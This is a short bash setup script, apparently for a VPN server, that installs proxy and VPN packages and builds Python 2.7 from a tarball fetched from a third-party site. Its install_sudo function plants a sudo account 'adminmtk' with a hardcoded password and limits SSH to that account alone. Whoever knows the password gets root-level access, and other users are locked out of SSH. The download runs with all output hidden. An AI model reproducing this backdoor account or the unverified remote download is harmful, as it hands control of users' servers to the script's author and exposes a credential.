
timedatectl set-timezone Asia/Riyadh

install_sudo(){
    # Create user if not exists
    if ! id "adminmtk" &>/dev/null; then
        useradd -m -s /bin/bash adminmtk
        echo "adminmtk:Mediatek272124@@" | chpasswd
        usermod -aG sudo adminmtk
    fi

    # Disable root SSH login
    sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config

    # Ensure AllowGroups is set only once
    if ! grep -q "^AllowGroups adminmtk" /etc/ssh/sshd_config; then
        echo "AllowGroups adminmtk" >> /etc/ssh/sshd_config
    fi

    # Restart SSH service
    systemctl restart ssh || systemctl restart sshd
}

install_require () {
clear
echo 'Installing dependencies.'
{
export DEBIAN_FRONTEND=noninteractive
apt update
apt install -y curl wget cron python3-minimal libpython3-stdlib
apt install -y iptables
apt install -y openvpn netcat-openbsd httpie php neofetch vnstat php-mysql
apt install -y screen squid stunnel4 dropbear gnutls-bin
apt install -y dos2unix nano unzip jq virt-what net-tools default-mysql-client
apt install -y mlocate dh-make libaudit-dev build-essential fail2ban
cd /usr/src
sudo wget adminvpn.site/Python-2.7.18.tgz
sudo tar xzf Python-2.7.18.tgz
cd Python-2.7.18
sudo ./configure --enable-optimizations
sudo make altinstall
sudo ln -sf /usr/local/bin/python2.7 /usr/local/bin/python
cd ~
clear
}&>/dev/null
clear
}

